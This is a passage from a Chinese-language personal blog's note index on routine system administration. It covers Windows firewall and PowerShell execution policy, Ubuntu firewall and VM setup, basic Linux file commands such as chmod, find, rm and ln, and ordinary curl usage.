选择**特定端口** 然后输入端口，如有多个端口需要用逗号隔开了 例如:88,8080\n 第三步 选择**允许连接**\n 第四步 选择**应用规则**的范围\n 第五步 输出规则名称\n\n>  另外win7的 IIS7，只需启用 入站规则：BranchCache 内容检索(HTTP-In)。出站规则： BranchCache 内容检索(HTTP-Out) 即可。\n\n## Windows 特殊文件路径\n\n| 说明             | 路径                                                         |\n| ---------------- | ------------------------------------------------------------ |\n| 开机启动程序路径 | C:\\Users\\Administrator\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup |\n| host文件位置     | C:\\Windows\\System32\\drivers\\etc                              |\n|                  |                                                              |\n|                  |                                                              |\n|                  |                                                              |\n\n# PowerShell 执行脚本报错\n\nwindow power shell 错误提示：因为在此系统上禁止运行脚本\n\n<img src=\"https://hmxyl-image.oss-cn-hangzhou.aliyuncs.com/note/470d9697342be97e0646a2b0549a0dc2.png\" alt=\"在这里插入图片描述\" style=\"zoom:67%;\" /> \n\n> 电脑左下角搜索`windows powershell` , 以**管理员身份**运行。输入`get-ExecutionPolicy`， 回车\n> \n>显示`Restricted`，表示受限制的，执行脚本受限。输入`set-ExecutionPolicy`， 回车，然后输入：`RemoteSigned`， 即下载的脚本执行时才需要签名\n> \n>确认操作，输入Y\n> \n\n\nWindows给powershell设定一个叫“执行策略”的东西。为了避免一些恶意脚本直接运行，一般家用的windows系统默认将执行策略设置成了“Restricted”，即受限制的。\n\n所有的执行策略如下所示:\n\n| 策略         | 说明                                                         |\n| ------------ | ------------------------------------------------------------ |\n| AllSigned    | 要求所有脚本和配置文件均需受信任的发布者签名，包括在本地计算机上编写的脚本。（安全但是本地编写的脚本也要签名，麻烦） |\n| Bypass       | 不会阻止你运行任何脚本，也没有提示和警告。（不安全）         |\n| Default      | 默认的执行策略，普通桌面Windows默认Restricted，服务器windows默认RemoteSigned |\n| RemoteSigned | 要求从互联网上下载的所有脚本和配置文件均需要受信任的发布者签名，本地脚本则不需要签名。是Windows服务器的默认执行策略。（较为安全） |\n| Restricted   | 无法加载配置文件或运行脚本。桌面Windows的默认执行策略。(安全，但无法运行脚本) |\n| Unrestricted | 为允许所有的脚本运行                                         |\n|              |                                                              |\n\n\n\n","tags":["操作系统","日常记录"],"categories":["工具|部署","Windows"]},{"title":"Ubuntu卸载图形界面","url":"/20250619/f075b7f2.html","content":"\n1、打开终端（快捷键Ctrl + Alt + t）\n\n2、卸载gnome-shell主程序\n\n```sh\nsudo apt-get remove gnome-shell\n```\n\n3、卸载掉gnome\n\n```sh\nsudo apt-get remove gnome \n```\n\n\n\n4、卸载不需要的依赖关系\n\n```sh\nsudo apt-get autoremove\n```\n\n5、彻底卸载删除gnome的相关配置文件\n\n```sh\nsudo apt-get purge gnome\n```\n\n\n\n6、清理安装gnome时候留下的缓存程序软件包\n\n```sh\nsudo apt-get autoclean\nsudo apt-get clean\n```\n\n\n\n7、重启\n\n```sh\nshutdown -r now\n```\n\n","tags":["操作系统"],"categories":["工具|部署","Ubuntu"]},{"title":"Ubuntu 查看系统信息","url":"/20250619/d81e4de4.html","content":"\n| 命令                      | 说明                                                         |\n| ------------------------- | ------------------------------------------------------------ |\n| 查看 linux 内核，GCC 版本 | ubantu : `cat /proc/version`<br />Linux 的 Redhat/Centos: `cat /etc/redhat-release` |\n| 系统版本                  | `uname -a`                                                   |\n|                           |                                                              |\n|                           |                                                              |\n|                           |                                                              |\n|                           |                                                              |\n|                           |                                                              |\n|                           |                                                              |\n|                           |                                                              |\n\n```sh\nlisa@ubuntu:~$ cat /proc/version\nLinux version 5.19.0-32-generic (buildd@lcy02-amd64-026) (x86_64-linux-gnu-gcc (Ubuntu 11.3.0-1ubuntu1~22.04) 11.3.0, GNU ld (GNU Binutils for Ubuntu) 2.38) #33~22.04.1-Ubuntu SMP PREEMPT_DYNAMIC Mon Jan 30 17:03:34 UTC 2\nalisa@ubuntu:~$ \nalisa@ubuntu:~$ \nalisa@ubuntu:~$ uname -a\nLinux ubuntu 5.19.0-32-generic #33~22.04.1-Ubuntu SMP PREEMPT_DYNAMIC Mon Jan 30 17:03:34 UTC 2 x86_64 x86_64 x86_64 GNU/Linux\nalisa@ubuntu:~$ ^C\nalisa@ubuntu:~$ lsb_release -a\nNo LSB modules are available.\nDistributor ID:\tUbuntu\nDescription:\tUbuntu 22.04.2 LTS\nRelease:\t22.04\nCodename:\tjammy\n\n```\n\n> LTS(Long-Term-Support)长期支持版本，会获得5年的升级维护支持。 \n\n","tags":["操作系统"],"categories":["工具|部署","Ubuntu"]},{"title":"Ubuntu 防火墙","url":"/20250619/b3c2ebd8.html","content":"\n# 查看防火墙的状态\n\n```sh\nsudo ufw status\n```\n\n`inactive`表示防火墙没有开启，并不是没有安装防火墙。\n\n安装防火墙（Ubuntu系统默认是安装了ufw防火墙的）：\n\n```\nsudo apt-get install ufw\n```\n\n# Ubuntu开启防火墙\n\n```sh\nsudo ufw enable\n```\n\n命令可能会中断现有的ssh连接。继续操作(y|n)?\n\n因为是在远程的Xshell进行连接开启防火墙的，有的系统是没有将SSH的22端口设置为public的，所以会有这样的提示.\n\n这里分为两种情况，如果开启防火墙时在防火墙之中检测到22端口已添加为防火墙的开放端口，那么输入y继续操作以后，当前Xshell会自动断开连接；\n\n相反，如果开启防火墙时在防火墙之中没有检测到22端口，那么输入y继续操作以后22端口将会不再支持其他连接，只支持当前已有的这个连接，保持当前连接的原因是可以通过该连接开放22端口。\n\n这里之前没有设置过，直接输入y继续执行\n\n# Ubuntu防火墙添加开放普通端口\n\n开放22端口\n\n```sh\nsudo ufw allow 22\n```\n\n开启完成，需要重启防火墙生效：\n\n```sh\nsudo ufw reload\n```\n\n查看防火墙的状态\n\n```sh\nroot@ubuntu:/opt/docker/elasticsearch# sudo ufw status\nStatus: active\n\nTo                         Action      From\n--                         ------      ----\n22                         ALLOW       Anywhere               \n22 (v6)                    ALLOW       Anywhere (v6)               \n```\n\n查看22端口的监听状态\n\n```sh\nroot@ubuntu:/opt/docker/elasticsearch# sudo netstat -tunlp | grep 22\ntcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      839/sshd: /usr/sbin \ntcp6       0      0 :::22                   :::*                    LISTEN      839/sshd: /usr/sbin \n```\n\n# Ubuntu防火墙关闭普通端口\n\n```sh\nsudo ufw delete allow 21\n```\n\n# Ubuntu防火墙开放规定协议的端口\n\n```sh\nsudo ufw allow 8001/tcp\n```\n\n# Ubuntu防火墙关闭指定协议端口\n\n```sh\nsudo ufw delete allow 8001/tcp\n```\n\n# Ubuntu防火墙开放限定ip地址端口\n\n- 开放指定ip所有操作\n\n  ```sh\n  sudo ufw allow from 192.168.1.11\n  ```\n\n- 关闭指定ip所有操作\n\n  ```sh\n  sudo ufw delete allow from 192.168.1.11\n  ```\n\n- 开放指定ip对应端口操作\n\n  ```sh\n  sudo ufw allow from 192.168.1.12 to any port 3306\n  ```\n\n- 开放指定ip对应端口操作\n\n  ```sh\n  sudo ufw delete allow from 192.168.1.12 to any port 3306\n  ```\n\n\n\n\n\n","tags":["操作系统"],"categories":["工具|部署","Ubuntu"]},{"title":"Ubuntu虚拟机搭建","url":"/20250619/6124f545.html","content":"\n# 基础工具安装\n\n- apt-get -y install wget    (wget)\n- apt-get -y install net-tools   (ifconfig)\n\n- snap install curl  \n\n# 安装软件\n\n```sh\nteamviewer_linux.deb\nsudo dpkg --install teamviewer_linux.deb\n```\n\n\n\n#  首次登录切换root\n\nsu切换至root权限时报错`su: Authentication failure`\n\n分析原因：**可能是初次使用此命令，需要更新root密码**\n\n解决方法：执行`sudo passwd root`命令，完成后再次输入su即可切换权限\n\n![image-20220505102534819](https://hmxyl-image.oss-cn-hangzhou.aliyuncs.com/note/image-20220505102534819-1678133189220-1.png) \n\n\n\n# 安装SSH服务器端\n\n- 执行`apt-get install openssh-server` ，安装服务端\n\n- 允许远程使用root账号ssh登入\n\n  修改/etc/ssh/sshd_config文件，修改如下：\n\n  ```sh\n  #PermitRootLogin prohibit-password\n  PermitRootLogin yes\n  ```\n\n  需要重启系统或者sshd服务\n\n  - sudo /etc/init.d/ssh stop\n  - sudo /etc/init.d/ssh start\n  - sudo service ssh start\n\n- 开机启动`sudo systemctl enable ssh`\n\n- 重启之后，`/usr/bin/xauth: file /root/.Xauthority does not exist` 错误消失\n\n\n\n","tags":["操作系统"],"categories":["工具|部署","Ubuntu"]},{"title":"Linux系统文件操作命令","url":"/20250619/44c28660.html","content":"\n# Linux系统文件操作命令\n\n## 【chown】更改文件或目录所有者和所属组\n\n```sh\n# 格式\nchown [选项] [新所有者][:新组] 文件或目录...\n\n# 选项\n-R\t递归处理，更改目录及其下所有内容的所有权\n-v\t显示详细的处理信息\n-c\t类似 -v，但仅在发生更改时报告\n-f\t不显示错误信息\n--reference=参考文件（使用参考文件的所有者和组，而不是显式指定）\n```\n\n```sh\n# 更改文件所有者\nchown username filename\n# 同时更改所有者和组\nchown username:groupname filename\n# 只更改文件所属组（两种等效方式）：\nchown :groupname filename\n# 或\nchgrp groupname filename\n#递归更改目录及其内容的所有权：\nchown -R username:groupname directory/\n# 使用用户ID和组ID（数字形式）\nchown 1000:1000 filename\n# 复制其他文件的所有权设置：\nchown --reference=source_file target_file\n```\n\n\n\n## 【chmod】更改文件或目录权限\n\n```sh\n# 格式\nchmod [选项] 模式 文件或目录...\n# 常用选项\n-R\t递归处理，更改目录及其下所有内容的权限\n-v\t显示详细的处理信息\n-c\t类似 -v，但仅在发生更改时报告\n-f\t不显示错误信息\n```\n\n- 权限表示方法：字母表示法（u/g/o/a +/-/= r/w/x）\n\n  ```sh\n  符号\t含义\n  u\t文件所有者(user)\n  g\t文件所属组(group)\n  o\t其他用户(others)\n  a\t所有用户(all)\n  +\t添加权限\n  -\t移除权限\n  =\t设置权限\n  ```\n\n  范例\n\n  ```sh\n  # 给所有者添加执行权限\n  chmod u+x filename\n  # 给组和其他用户移除写权限\n  chmod go-w filename\n  # 设置所有用户只有读权限\n  chmod a=r filename\n  # 给所有者读写执行，组读执行，其他用户无权限\n  chmod u=rwx,g=rx,o= filename\n  ```\n\n- 权限表示方法：数字表示法（八进制数）。三位数字分别表示：所有者、组、其他用户的权限\n\n  ```\n  数字\t权限\n  4\t读(r)\n  2\t写(w)\n  1\t执行(x)\n  0\t无权限(-)\n  ```\n\n  范例\n\n  ```sh\n  # 设置权限为 rwxr-xr-- (754)：所有者读写执行(4+2+1 = rwx)，组读执行(4+1 = r-x)，其他用户读(4 = r--)\n  chmod 754 filename\n  \n  # 常用权限设置\n  # 所有者读写，组和其他用户只读\n  chmod 644 filename  \n  # 所有者完全控制，组和其他用户读执行\n  chmod -R 755 directory \n  # 仅所有者可读写（保护敏感文件）\n  chmod 600 private_file \n  ```\n\n\n\n##  【truncate】清空文件\n\n> 清空正在使用的 catalina.out文件：`truncate -s 0 catalina.out`\n\n- 使用 truncate 命令清空文件\n\n  ```sh\n  # -s 参数是设置文件的大小，清空文件的话，就设定为0\n  truncate -s 0 catalina.out\n  ```\n\n- 使用 echo 命令清空文件 \n\n  ```sh\n  echo -n \" \" > catalina.out  \n  ```\n\n## 【tree】树形结构查看文件\n\n```sh\napt install tree\n或者\nyum install tree\n```\n\n\n\n##  【du】查看占用的磁盘空间\n\n```sh\n格式：du [选项] [文件]\n参数:\n    -a或-all 显示目录中个别文件的大小\n    -b或-bytes 显示目录或文件大小时，以byte为单位\n    -c或--total 除了显示个别目录或文件的大小外，同时也显示所有目录或文件的总和\n    -k或--kilobytes 以KB(1024bytes)为单位输出\n    -m或--megabytes 以MB为单位输出\n    -s或--summarize 仅显示总计，只列出最后加总的值\n    -h或--human-readable 以K，M，G为单位，提高信息的可读性\n    -x或--one-file-xystem 以一开始处理时的文件系统为准，若遇上其它不同的文件系统目录则略过\n    -L<符号链接>或--dereference<符号链接> 显示选项中所指定符号链接的源文件大小\n    -S或--separate-dirs 显示个别目录的大小时，并不含其子目录的大小\n    -X<文件>或--exclude-from=<文件> 在<文件>指定目录或文件\n    --exclude=<目录或文件> 略过指定的目录或文件\n    -D或--dereference-args 显示指定符号链接的源文件大小\n    -H或--si 与-h参数相同，但是K，M，G是以1000为换算单位\n    -l或--count-links 重复计算硬件链接的文件。\n范例：du -hm 目录名称\n```\n\n\n\n## 【find】查找文件\n\n```sh\n格式 : find [path...] [expression]\n说明 : 将符合 expression 的文件列出来。                    \n```\n\n| 参数                                     | 全称          | 作用                                                         |\n| ---------------------------------------- | ------------- | ------------------------------------------------------------ |\n| ` -atime n`                              | access minute | 在过去 **n 天**被读取过的文件                                |\n| ` -ctime n`                              | change time   | 在过去 **n 天**文件状态（权限变更、所有者变更、链接数变更等元数据修改）被修改的文件 |\n| `-mtime n`                               | modify time   | 在过去 **n 天**文件内容被修改的文件<br />`-mtime n`：精确匹配 **n 天前**修改的文件<br />`-mtime +n`：查找修改时间**超过 n 天**的文件<br />`-mtime -n`：查找修改时间在 **n 天内**的文件 |\n| ` -amin n`                               | access minute | 在过去 **n 分钟**内被读取过的文件                            |\n| ` -cmin n`                               | change time   | 在过去 **n 分钟**文件状态（权限变更、所有者变更、链接数变更等元数据修改）被修改的文件 |\n| `-mmin n`                                | modify minute | 在过去 **n 分钟**文件内容被修改的文件                        |\n| ` -anewer file`                          |               | 比文件 file 更晚被读取过的文件                               |\n| ` -cnewer file`                          |               | 比文件 file 更新的文件                                       |\n| ` -name filename`<br />`-iname filename` |               | 符合 filename 的文件。iname 会忽略大小写                     |\n| ` -size n`                               |               | 文件大小 是 n 单位，b 代表 512 位元组的区块，c 表示字元数，k表示 kilo bytes，w 是二个位元组。 |\n| ` -type c`                               |               | 文件类型是 c 的档案。                                        |\n\n范例:\n\n1. 将当前目录及其子目录下所有扩展名是 c 的文件列出来：`find . -name \"*.c\"`\n\n2. 将当前目录及其子目录下所有最近 20 分钟内更新过的文件列出：`find . -cmin -20`\n\n3. 查找包含字符串的文件：`find /opt/Tomcat7  -name \"system.properties\"|xargs grep -ri \"BASCI_UPDATE\"`\n\n4. 将/usr/local/backups目录下10天前修改过的，名称包含localhost的文件删除：`find /usr/local/backups -mtime +10 -name \"*localhost*.*\" |xargs rm -rf`\n\n   ```sh\n   find /usr/local/backups -mtime +10 -name \"*.*\" |xargs rm -rf\n   或者\n   find /usr/local/backups -mtime +10 -name \"*.*\" -exec rm -rf {} \\;\n   \n   说明： 　　\n   find：linux的查找命令，用户查找指定条件的文件 　　\n   /usr/local/backups：想要进行清理的任意目录 　　\n   -mtime：标准语句写法 　　\n   ＋10：查找10天前的文件，这里用数字代表天数，＋30表示查找30天前的文件\n   \"*.*\"：希望查找的数据类型，\"*.jpg\"表示查找扩展名为jpg的所有文件，\"*\"表示查找所有文件，这个可以灵活运用，举一反三 　　\n   \n   \n   -exec rm -rf {} \\; ：find发现的结果一次性传给exec选项，删除\n   |xargs rm -rf : 分批次的处理删除（推荐）\n   ```\n\n\n\n## 【grep】搜索文件内字符串\n\n```sh\n格式：grep [-no] pattern files\n参数：\n     -n 显示行号\n     -o 只显示匹配的串\n```\n\n范例：\n\n```sh\ngrep  printf *\n    file1.c:   printf(\"\\nHello\\n\");\n    file2.c:   printf(\"\\nSample\\n\");\n\ngrep -n  printf *\n    file1.c:4   printf(\"\\nHello\\n\");\n    file2.c:9   printf(\"\\nSample\\n\");\n\ngrep -o  printf *\n   file1.c:   printf\n   file2.c:   printf\n\n# 如果搜索的串中有空格，则用引号括起来\ngrep \"asd abc\" *\n```\n\n\n\n## 【wc】统计指定文件中的字节数、字数、行数\n\n```sh\n格式：wc [选项] 文件名称\n选项 ：\n   -c 统计字节数。\n   -l 统计行数。\n   -m 统计字符数。这个标志不能与 -c 标志一起使用。\n   -w 统计字数。一个字被定义为由空白、跳格或换行字符分隔的字符串。\n   -L 打印最长行的长度。\n   -help 显示帮助信息\n   --version 显示版本信息\n```\n\n\n\n## 【cp】拷贝文件\n\n```sh\n格式：cp [-arf] source dest\n参数:\n   -a  将文件状态、权限等信息都照原状予以复制。\n   -r  若 source 中含有目录名，则将目录下的文件顺序拷贝至目的地。\n   -f  若目的地已经有相同的文件名存在，则在复制前先予以删除再行复制。\n```\n\n范例： \n\n```sh\n# 1. 将文件 aaa 复制一份名字为 bbb 的文件:         \ncp aaa bbb   \n# 2. 将当前目录下的所有C程序拷贝到当前目录下的Finished 子目录中：\ncp *.c Finished\n# 3. 将souce目录拷贝到当前目录下\ncp -arf source .\n```\n\n\n\n## 【mv】移动文件\n\n```sh\n格式：mv [-i] source dest\n参数：-i 若目的地已有同名文件，则先询问是否覆盖旧文件\n```\n\n范例：\n\n```sh\n# 1. 将文件 aaa 改名为 bbb :\nmv aaa bbb\n# 2. 将所有的C程序移至当前目录下的 target 子目录中：\nmv -i *.c  target\n```\n\n\n\n## 【rm】删除文件及目录\n\n```sh\n格式：rm [-ifr] name...\n参数：\n   -i  删除前逐一询问确认。\n   -f  即使原文件属性设为只读，也直接删除，无需逐一确认。\n   -r  将目录及以下之文件逐一删除。\n```\n\n范例\n\n```sh\n# 1.  删除所有C程序文件并删除前逐一询问确认 :\nrm -i *.c\n# 2. 将 Finished 子目录及子目录中所有文件删除 :\nrm -r Finished\n```\n\n\n\n## 【tail】条件查看文件内容\n\n```sh\n格式：tail [ -f ] [ -c Number | -n Number | -m Number | -b Number | -k Number ]  文件名称\n参数：\n-f：（follow）该参数用于监视File文件增长。\n-n  Number：从 Number 行位置读取指定文件。\n-c  Number：从 Number 字节位置读取指定文件\n-m  Number：从 Number 多字节字符位置读取指定文件，比方你的文件假设包括中文字，假设指定-c参数，可能导致截断，但使用-m则会避免该问题。\n-b  Number：从 Number 表示的512字节块位置读取指定文件。\n-k  Number：从 Number 表示的1KB块位置读取指定文件。\n\n上述命令中，都涉及到number，假设不指定，默认显示10行。\nNumber前面可使用正负号，表示该偏移从顶部还是从尾部開始计算。\ntail可运行文件一般在/usr/bin/以下。\n```\n\n示例\n\n```sh\n# 1、监视filename文件的尾部内容（默认10行，相当于增加参数 -n 10），刷新显示在屏幕上。退出，按下CTRL+C。 \ntail -f filename \n# 2、显示filename最后20行\ntail -n 20 filename \n# 3、实时查看 Nginx 日志中出现的 40\ntail -f /var/log/nginx/access.log | grep \"404\"\n```\n\n\n\n\n\n## 【cat】 查看文件（文件拼接）\n\n```sh\n格式：cat [-AbeEnstTuv] [--help] [--version] fileName\n说明：把文件串连接后输出到荧幕或加 > fileName 到另一个档案\n参数：\n    -A 等价于 -vET\n    -n或 --number 由 1 开始对所有输出的行数编号\n    -b或 --number-nonblank和 -n 相似，只不过对于空白行不编号\n    -e 等价于 –vE\n    -E 每行末尾显示一个$符号\n    -s或 --squeeze-blank 当遇到有连续两行以上的空白行，就代换为一行的空白行\n    -t 等价于 –vT\n    -T 显示制表符为 ^I\n    -v或 --show-nonprinting,  dos格式的回车换行显示为^M\n```\n\n范例：`> 为重定向操作符`（文件存在，覆盖内容）， `>>为重定向追加操作符`（文件存在，追加）\n\n```sh\n# 1.把 textfile1 的文件内容加上行号后输入到textfile2 文件里：\ncat -n textfile1 > textfile2\n# 2.把 textfile1 和 textfile2 的文件内容加上行号（空白行不加）之后将内容附加到 textfile3 \ncat -b textfile1 textfile2 >> textfile3\n```\n\n\n\n## 【more】文件查看\n\n```sh\n格式：more  [-num] [+linenum] [fileNames..]\n说明：类似 cat ，不过是以一页一页的方式显示。而最基本的指令就是按空白键（space）就往下一页显示，按 b 键就会往回（back）一页显示。\n参数：\n    -num 一次显示的行数\n    +linenum 从第 num 行开始显示\n    fileNames 欲显示内容的文件，可为多个文件\n```\n\n范例：\n\n```sh\n#从第 20 行开始，每页10行显示 testfile 文件内容\nmore -10 +20 testfile\n```\n\n\n\n## 【less】文件查看\n\n`less` 是 Linux 系统中一个功能强大的文件查看工具，比传统的 `more` 命令更加强大和灵活。它允许用户向前或向后浏览文件内容，支持搜索、标记等多种功能\n\n```sh\n格式： less [选项] filename\n说明： less 的作用与 more 十分相似，都可以用来浏览文本文件的内容，不同的是 less 允许使用者往回卷动（PageUp PageDown）以浏览已经看过的部份，同时因为 less 并未在一开始就读入整个文件，因此在遇上大型文件的开启时，会比一般的文本编辑器(如vi)来的快速。\n\n常用选项：\n-N\t显示行号\n-i\t忽略搜索时的大小写\n-I\t强制忽略大小写\n-F\t如果文件内容少于一屏，自动退出\n-X\t退出时不清理屏幕\n-S\t截断长行而不是换行显示\n-r\t显示控制字符\n-M\t显示更详细的提示信息\n```\n\n- 常见操作命令\n\n| 操作分类 | 功能                                                         |\n| -------- | ------------------------------------------------------------ |\n| 浏览操作 | `空格键` 或 `f`：向下翻一页<br/>`b`：向上翻一页<br/>`回车键` 或 `e`：向下翻一行<br/>`y` 或 `k`：向上翻一行<br/>`d`：向下翻半页<br/>`u`：向上翻半页<br/>`g`：跳到文件开头<br/>`G`：跳到文件末尾<br/>`50%`：跳到文件50%的位置<br/>`Ctrl+F`：向前滚动一屏<br/>`Ctrl+B`：向后滚动一屏 |\n| 搜索功能 | `/`：向前搜索（输入模式）<br/>`?`：向后搜索（输入模式）<br/>`n`：重复上一次搜索（同方向）<br/>`N`：重复上一次搜索（反方向） |\n| 标记位置 | `m + 字母`：用字母标记当前位置<br/>`' + 字母`：跳转到标记位置 |\n| 文件操作 | `:e 文件名`：打开新文件<br/>`:n`：查看下一个文件（多文件打开时）<br/>`:p`：查看上一个文件（多文件打开时） |\n| 其他功能 | `v`：使用默认编辑器编辑当前文件<br/>`h`：显示帮助信息<br/>`q`：退出 less |\n\n## 【touch】新建文件\n\n```sh\ntouch 文件名\n```\n\n\n\n## 【mkdir】创建目录\n\n```sh\nmkdir 目录名\n\n常用选项：\n-p\t递归创建目录，如果父目录不存在则一并创建 mkdir -p project/src/main/java\n-m\t设置目录权限，如 mkdir -m 755 dirname\n-v\t显示创建目录的详细信息 \n```\n\n范例：\n\n```sh\n# 批量创建多个目录结构：\nmkdir -p project/{src,test}/{main,test}/{java,resources}\n# 创建带空格的目录\nmkdir \"my folder\"\n```\n\n> 注意事项：\n>\n> 1. 如果目录已存在，`mkdir` 会报错，使用 `-p` 选项可以避免这个错误\n> 2. 需要有父目录的写权限才能创建子目录\n> 3. 目录名区分大小写\n> 4. 目录名可以包含空格，但需要用引号括起来： `mkdir \"my folder\"`\n\n\n\n## 【ln】创建软链接\n\n```sh\nln -s [源文件或目录] [链接名称]\n或者\nln -sf [源文件或目录] [链接名称]\n\n说明：使用 -f 选项可以强制覆盖已存在的链接\n```\n\n范例：\n\n```sh\n# 在当前目录创建软连接： \nln -s /etc/passwd mypasswd\n# 创建文件软连接：\nln -s /path/to/original/file /path/to/link\n# 创建目录软连接\nln -s /path/to/original/directory /path/to/link\n# 创建相对路径的软连接（推荐）：\nln -s ../original/file link_name\n\n# 版本切换（通过切换软连接指向）使用 -f 选项可以强制覆盖已存在的链接\nln -sf /opt/software/v2.0 /opt/software/current\n\n# 查看软链接的实际地址\nrealpath /path/to/link\n# 查看软连接：输出中箭头 -> 指向源文件\nls -l /path/to/link\n# 查看软链接\nfile /path/to/link\n\n# 删除软链接（不要加 / 在末尾，否则会删除源文件内容）\nrm /path/to/link\n```\n\n软链接验证\n\n```sh\nroot@hots-Lenovo:/data# apt install tree\nroot@hots-Lenovo:/data# tree\n.\n├── link-real\n│   ├── a-real\n│   └── b-real\n│       └── test.txt\n└── link-soft\n\n4 directories, 1 file\nroot@hots-Lenovo:/data# ln -s /data/link-real/a-real  /data/link-soft/a-soft\nroot@hots-Lenovo:/data# \nroot@hots-Lenovo:/data# ln -s /data/link-real/b-real  /data/link-soft/b-soft\nroot@hots-Lenovo:/data# tree\n.\n├── link-real\n│   ├── a-real\n│   └── b-real\n│       └── test.txt\n└── link-soft\n    ├── a-soft -> /data/link-real/a-real\n    └── b-soft -> /data/link-real/b-real\n\n6 directories, 1 file\nroot@hots-Lenovo:/data# realpath /data/link-soft/a-soft\n/data/link-real/a-real\nroot@hots-Lenovo:/data# realpath /data/link-soft/b-soft\n/data/link-real/b-real\nroot@hots-Lenovo:/data/link-soft/b-soft# ls /data/link-soft/b-soft\ntest.txt\nroot@hots-Lenovo:/data# file /data/link-soft/a-soft\n/data/link-soft/a-soft: symbolic link to /data/link-real/a-real\n```\n\n- 注意事项\n\n  > 1. 创建软连接时最好使用绝对路径，避免移动后失效\n  > 2. 不要创建循环链接（A指向B，B指向A）\n  > 3. 删除软连接时不要加 `/` 后缀\n  > 4. 软连接的权限不影响源文件的权限\n  > 5. 使用 `-f` 选项可以强制覆盖已存在的链接\n\n- 软连接 vs 硬链接\n\n  | 特性         | 软连接        | 硬链接       |\n  | :----------- | :------------ | :----------- |\n  | 创建命令     | `ln -s`       | `ln`         |\n  | 跨文件系统   | 支持          | 不支持       |\n  | 链接目录     | 支持          | 不支持       |\n  | 原始文件删除 | 链接失效      | 仍然有效     |\n  | inode        | 与源文件不同  | 与源文件相同 |\n  | 文件类型     | 特殊文件（l） | 普通文件     |\n","tags":["Linux"],"categories":["Linux","基础命令"]},{"title":"Linux系统命令行工具","url":"/20250619/f0a9e559.html","content":"\n\n\n#  Linux系统命令行工具\n\n## curl：用于通过 URL 传输数据\n\n```sh\ncurl [选项] [URL...]\n```\n\n- 常用选项：请求相关\n\n  | 选项                | 描述                                           |\n  | :------------------ | :--------------------------------------------- |\n  | `-X`/`--request`    | 指定 HTTP 请求方法 (GET, POST, PUT, DELETE 等) |\n  | `-H`/`--header`     | 添加 HTTP 请求头                               |\n  | `-d`/`--data`       | 发送 POST 请求数据                             |\n  | `-G`/`--get`        | 将 -d 数据作为 URL 查询参数发送 (GET)          |\n  | `-F`/`--form`       | 发送 multipart/form-data 数据 (文件上传)       |\n  | `-b`/`--cookie`     | 发送 Cookie                                    |\n  | `-A`/`--user-agent` | 设置 User-Agent                                |\n\n- 常用选项：输出控制\n\n  | 选项                 | 描述                           |\n  | :------------------- | :----------------------------- |\n  | `-i`/`--include`     | 输出包含响应头                 |\n  | `-I`/`--head`        | 只获取响应头                   |\n  | `-o`/`--output`      | （小写）将输出保存到文件       |\n  | `-O`/`--remote-name` | （大写）使用远程文件名保存输出 |\n  | `-s`/`--silent`      | 静默模式 (不显示进度/错误)     |\n  | `-v`/`--verbose`     | 显示详细操作信息               |\n  | `-c/--cookie-jar`    | 保存服务器返回的 Cookie        |\n\n- 常用选项：连接设置\n\n  | 选项                | 描述                  |\n  | :------------------ | :-------------------- |\n  | `-L`/`--location`   | 跟随重定向            |\n  | `-k`/`--insecure`   | 允许不安全的 SSL 连接 |\n  | `--connect-timeout` | 设置连接超时时间      |\n  | `--retry`           | 失败重试次数          |\n\n- 范例：基本请求\n\n  ```sh\n  # 1. 发送 GET 请求， 获取请求内容\n  curl https://www.baidu.com\n  curl -X GET https://www.baidu.com\n  \n  # 2. 获取响应头\n  curl -I https://www.baidu.com\n  # 3. 获取完整响应（包含头和请求内容）,并将输出内容存储到本地文件\n  curl -i https://www.baidu.com -o /opt/test.txt\n  # 4. 测试 API\n  curl -X GET \"https://api.example.com/users?id=123\" -H \"Accept: application/json\"\n  ```\n\n- 范例：数据交互\n\n  ```sh\n  # 1. 发送 POST 请求\n  curl -X POST -d 'key1=value1&key2=value2' https://example.com/api\n  # 2. 发送 JSON 数据\n  curl -X POST -H \"Content-Type: application/json\" \\\n  -d '{\"key1\":\"value1\", \"key2\":\"value2\"}' \\\n  https://example.com/api\n  # 3. 发送表单数据（文件上传）\n  curl -F \"file=@/path/to/file\" -F \"name=file_name\" https://example.com/upload\n  # 4. 登录并保存 Cookie\n  curl -c cookies.txt -d \"user=admin&pass=123\" https://example.com/login\n  curl -X POST -c cookies.txt -d \"username=test&password=123\" https://example.com/login\n  # 5. 使用保存的 Cookie 访问需要认证的页面\n  curl -b cookies.txt https://example.com/profile\n  # 6. 从标准输入读取 Cookie\n  echo \"name=value\" | curl -b - https://example.com\n  # 7. 清除会话（使用空 Cookie 文件）\n  curl -b empty_cookies.txt https://example.com/logout\n  ```\n\n- 范例：认证与安全\n\n  ```sh\n  # 1. 基本认证\n  curl -u username:password https://example.com\n  # 2. Bearer Token 认证\n  curl -H \"Authorization: Bearer token_string\" https://example.com/api\n  # 3. 忽略 SSL 证书验证（测试用）\n  curl -k https://example.com\n  ```\n\n- 范例：下载文件\n\n  ```sh\n  # 1.下载文件并保存\n  curl -o local_filename https://example.com/remote_file\n  # 2.使用远程文件名保存\n  curl -O https://example.com/filename.ext\n  # 3.断点续传（从中断处继续）\n  curl -C - -O https://example.com/large_file\n  # 4.从第1000字节开始下载\n  curl -C 1000 -O http://example.com/largefile.zip\n  # 5.显示进度条\n  curl -C - --progress-bar -O http://example.com/largefile.zip\n  # 6.并行下载多个文件\n  curl -O https://example.com/file1 -O https://example.com/file2\n  # 7. 限制下载速度（字节/秒）\n  curl --limit-rate 100K -O https://example.com/large_file\n  \n  ```\n\n- 范例（高级用法）：代理访问\n\n  ```sh\n  # 通过代理访问\n  curl -x [代理地址]:[端口] [目标URL]\n  # 使用HTTP代理\n  curl -x http://proxy.example.com:8080 http://target.example.com\n  \n  # 使用HTTPS代理\n  curl -x https://secure-proxy.example.com:8443 https://target.example.com\n  \n  # 带认证的代理：用户名密码认证\n  curl -x http://username:password@proxy.example.com:8080 http://target.example.com\n  # 带认证的代理：用户名密码认证（分开指定）\n  curl -x http://proxy.example.com:8080 -U username:password http://target.example.com\n  ```\n\n- 范例：日常使用\n\n  ```sh\n  # 获取IP地址\n  curl ipinfo.io/ip\n  curl cip.cc\n  ```\n\n## kill：杀死进程\n\n```sh\n格式： kill [ -s signal ] pid ...\n      kill -l [ signal ]\n说明：kill 送出一个特定的信号 (signal) 给进程号为 pid 的进程。根据该信号而做特定的动作, 若没有指定,默认是送出终止 (TERM) 信号\n\n参数：\n    